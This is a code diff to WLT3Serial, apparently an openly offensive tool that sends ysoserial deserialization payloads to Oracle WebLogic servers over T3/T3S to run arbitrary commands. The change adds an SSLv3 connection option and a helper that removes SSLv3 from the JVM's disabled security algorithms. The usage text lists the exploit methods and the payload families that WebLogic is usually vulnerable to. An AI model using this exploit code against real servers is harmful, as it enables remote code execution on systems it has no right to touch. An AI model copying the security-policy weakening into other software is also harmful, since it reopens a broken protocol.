@@ -11,6 +11,7 @@ package bort.millipede.wlt3;
 import java.util.Collections;
 import java.util.List;
 import java.util.ArrayList;
+import java.security.Security;
 
 //third-party includes
 import ysoserial.Strings;
@@ -97,7 +98,7 @@ public class WLT3Serial {
 								System.setProperty("jdk.tls.client.protocols","TLSv1.2");
 								tlsSet = true;
 							} else {
-								System.err.println("Error: Multiple TLS version options set, please choose only one version\n");
+								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
 								usage();
 								return;
 							}
@@ -108,7 +109,7 @@ public class WLT3Serial {
 								System.setProperty("jdk.tls.client.protocols","TLSv1.1");
 								tlsSet = true;
 							} else {
-								System.err.println("Error: Multiple TLS version options set, please choose only one version\n");
+								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
 								usage();
 								return;
 							}
@@ -119,7 +120,18 @@ public class WLT3Serial {
 								System.setProperty("jdk.tls.client.protocols","TLSv1");
 								tlsSet = true;
 							} else {
-								System.err.println("Error: Multiple TLS version options set, please choose only one version\n");
+								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
+								usage();
+								return;
+							}
+							break;
+						case "--t3s=SSLv3": //use T3S to connect with SSLv3
+							if(!tlsSet) {
+								t3s = true;
+								System.setProperty("jdk.tls.client.protocols","SSLv3");
+								tlsSet = true;
+							} else {
+								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
 								usage();
 								return;
 							}
@@ -143,7 +155,7 @@ public class WLT3Serial {
 			final Object object = payload.getObject(command);
 			
 			//run exploit
-			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+": ... ");
+			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+(t3s ? " (with "+System.getProperty("jdk.tls.client.protocols")+")" : "")+": ... ");
 			switch(method) {
 				case "Property":
 					ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
@@ -171,6 +183,21 @@ public class WLT3Serial {
 		}
 	}
 	
+	//check current JVM security policy, and enable SSL (v3) communication if disabled
+	static void enableSSL() {
+		String tlsSecProp = Security.getProperty("jdk.tls.disabledAlgorithms");
+		if(tlsSecProp.contains("SSLv3")) {
+			if(tlsSecProp.contains("SSLv3,")) {
+				tlsSecProp = tlsSecProp.replace("SSLv3,","");
+				tlsSecProp = tlsSecProp.trim();
+			} else {
+				tlsSecProp = tlsSecProp.replace("SSLv3","");
+				tlsSecProp = tlsSecProp.trim();
+			}
+			Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
+		}
+	}
+	
 	//print Usage information
 	private static void usage() {
 		System.err.println("Usage: WLT3Serial [OPTIONS] REMOTE_HOST REMOTE_PORT PAYLOAD_TYPE PAYLOAD_CMD");
@@ -182,9 +209,8 @@ public class WLT3Serial {
 		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), also similar to JavaUnserializeExploits weblogic.py)");
 		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
 		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
-		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2 (Default)");
-		System.err.println("\t\t\tTLSv1.1\n\t\t\tTLSv1");
-		System.err.println("\t\t\t(Note: SSLv2 and SSLv3 are unsupported.)\n\n");
+		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2 (Default)\n\t\t\tTLSv1.1\n\t\t\tTLSv1\n\t\t\tSSLv3");
+		System.err.println("\t\t\t(Note: SSLv2 is unsupported.)\n\n");
 		
 		//list available ysoserial payload types, or print error on failure
 		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" types):");
